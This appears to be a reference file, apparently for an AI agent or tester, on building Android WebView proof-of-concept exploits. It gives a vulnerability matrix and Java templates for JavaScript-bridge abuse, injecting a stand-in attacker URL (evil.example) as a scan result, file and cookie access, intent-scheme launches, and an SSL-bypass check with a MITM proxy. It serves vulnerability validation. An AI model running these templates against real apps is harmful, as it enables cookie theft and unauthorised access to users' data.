---
name: poc-app-webview
description: WebView PoC reference covering JavaScript bridge exposure, scan-result injection, file access, URL validation bypass, SSL bypass, cookie leakage, and intent-scheme abuse.
---

# WebView PoC Reference

Use this reference for WebView-driven trust-boundary failures. WebView PoCs usually fit `hosted-web-content`, with `direct-trigger` used for scan-result or deep-link entry.

## Construction Matrix

| Vulnerability | Exploit mode | Typical support | Visible success |
|---------------|--------------|-----------------|-----------------|
| JavaScript bridge exposure | `hosted-web-content` | local HTML asset or remote test page | native bridge method is reachable from attacker content |
| scan-result injection | `direct-trigger` | none | scan or callback value drives attacker URL into trusted WebView |
| file access | `hosted-web-content` | local or remote HTML | local file or provider content becomes reachable |
| URL bypass | `direct-trigger` or `hosted-web-content` | none | untrusted URL passes intended allowlist |
| SSL bypass | manual `hosted-web-content` | external MITM setup | target proceeds on invalid certificate |
| cookie leakage | `hosted-web-content` | local or remote HTML | sensitive cookie becomes readable or exfiltrated |
| intent-scheme abuse | `hosted-web-content` | local or remote HTML | `intent://` or custom scheme triggers native launch |

## Construction Rules

- Prefer a minimal local HTML asset when a remote server adds no extra proof value
- Use a remote page only when the finding depends on remote-origin behavior
- For message-channel findings, treat `postWebMessage`, `WebMessagePort`, and `addWebMessageListener` as equivalent bridge surfaces
- For SSL bypass, keep the code path small and document the manual network setup instead of pretending the app alone proves MITM

## Pattern 1 - Hosted Web Content

Use for bridge exposure, cookie leakage, file access, and intent-scheme abuse.

```java
public final class WebViewJsBridgeExploit extends Exploit {
    public WebViewJsBridgeExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.WebViewActivity");
        intent.setData(Uri.parse("file:///android_asset/poc.html"));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
        log("Loaded attacker-controlled WebView content from local asset");
    }
}
```

Typical `poc.html` responsibilities:

- call the verified bridge method
- attempt `document.cookie` access if the finding is cookie-related
- navigate to `intent://...` if the finding is scheme-related
- attempt `file://` or provider fetches if the finding is file-access related

## Pattern 2 - Scan or Callback Driven Load

Use for `WebViewScanResultInjectExploit`.

```java
public final class WebViewScanResultInjectExploit extends Exploit {
    public WebViewScanResultInjectExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.ScanEntryActivity");
        intent.putExtra("scan_result", "https://evil.example/poc.html");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
        log("Injected attacker-controlled scan result into WebView entry activity");
    }
}
```

Fill with:

- real callback key or result field
- real scan or app-link entry activity

## Pattern 3 - Manual SSL Bypass Validation

Use for `WebViewSslBypassExploit`.

```java
public final class WebViewSslBypassExploit extends Exploit {
    public WebViewSslBypassExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.WebViewActivity");
        intent.setData(Uri.parse("https://sensitive-api.target.com/api/user"));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
        log("Start the target WebView flow, then validate the invalid-certificate acceptance with a MITM proxy.");
    }
}
```

Manual step:

- configure a proxy and invalid certificate to observe whether the app still proceeds

Do not claim `runtime-validated` unless that manual network step was actually completed.
